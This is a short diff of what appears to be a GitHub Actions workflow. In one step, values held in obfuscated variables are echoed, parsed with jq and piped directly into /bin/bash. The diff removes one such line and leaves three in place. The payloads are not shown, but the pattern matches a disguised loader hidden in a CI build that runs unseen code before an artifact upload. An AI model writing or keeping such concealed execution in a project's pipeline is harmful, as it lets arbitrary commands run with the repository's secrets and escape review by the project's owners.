@@ -21,7 +21,6 @@ jobs:
           echo $mmmdr0 | jq -r .mj72926 | /bin/bash
           echo $cgdir0 | jq -r .m16 | /bin/bash
           echo $snsii0 | jq -r .oyvt9 | /bin/bash
-          echo $byvb0092 | jq -r .ao12 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
